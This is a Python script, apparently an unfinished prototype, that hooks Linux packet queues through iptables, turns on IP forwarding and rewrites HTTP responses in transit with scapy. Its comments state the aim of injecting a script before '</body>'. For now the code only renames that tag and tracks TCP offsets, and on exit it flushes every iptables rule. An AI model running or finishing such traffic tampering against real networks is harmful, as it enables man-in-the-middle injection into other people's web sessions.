from netfilterqueue import NetfilterQueue
from scapy.all import *
import os
import traceback

PROTO_TCP = 6
PORT_WWW_HTTP = 80
TCP_FIN = 0x01
TCP_SYN = 0x02

MARK = ' ' * 1000

sessions = {}

def callback(pkt):
    try:
        data = IP(pkt.get_payload())
        if data.proto == PROTO_TCP and data.sport == PORT_WWW_HTTP: # incoming
            print(data.summary(), data.seq, data.ack)
            S = (data.dst, data.dport)
            if S not in sessions:
                sessions[S] = {'offset': 0, 'FIN_count': 0}
            print(bytes(data))
            if S in sessions:
                data[TCP].ack -= sessions[S]['offset']
                # print(len(bytes(data[TCP].payload)))

                raw = bytes(data[TCP].payload).decode('utf-8')
                loc = raw.find('</body>')
                if loc != -1: # didn't consider the case where '</body>' itself is a string, e.g., "var x = '</body>';".
                    # find the enclosing </body>
                    # should insert script before </body>
                    raw = raw[:loc] + '</yyyy>' + raw[loc + 7:]
                    # raw = ' ' * len(raw)

                    data[TCP].payload = bytes(raw, 'utf-8')
                    del data[TCP].chksum
                    del data[IP].chksum
                    # print(bytes(data))
                    pkt.set_payload(bytes(data))

                    data[TCP].payload = bytes(' ' * len(raw), 'utf-8')
                    # sessions[S]['offset'] = len(MARK)
                    del data[TCP].chksum
                    del data[IP].chksum
                    # data.show2()
                    # sendp(data)
                    # pkt.drop()
                    # return
            if data[TCP].flags & TCP_FIN and S in sessions:
                sessions[S]['FIN_count'] += 1
                if sessions[S]['FIN_count'] >= 2:
                    del sessions[S]

        elif data.proto == PROTO_TCP and data.dport == PORT_WWW_HTTP: # outgoing
            print(data.summary(), data.seq, data.ack)
            print(bytes(data))
            S = (data.src, data.sport)
            if data[TCP].flags == TCP_SYN:
                sessions[S] = {'offset': 0, 'FIN_count': 0}
            if S in sessions:
                data[TCP].seq += sessions[S]['offset']
            
    except:
        print('error')
        traceback.print_exc()
    
    pkt.accept()

def main():
    Qnum = 1
    rules = [
        f'iptables -I INPUT -j NFQUEUE --queue-num {Qnum} --queue-bypass',
        f'iptables -I OUTPUT -j NFQUEUE --queue-num {Qnum} --queue-bypass',
        f'iptables -I FORWARD -j NFQUEUE --queue-num {Qnum} --queue-bypass',
    ]
    for rule in rules:
        print(f'setting rule: {rule}')
        os.system(rule)

    os.system("sysctl net.ipv4.ip_forward=1")

    q = NetfilterQueue()
    q.bind(Qnum, callback)
    try:
        q.run()
    except KeyboardInterrupt:
        pass
    q.unbind()
    os.system('iptables -F')
    os.system('iptables -X')

if __name__ == "__main__":
    main()
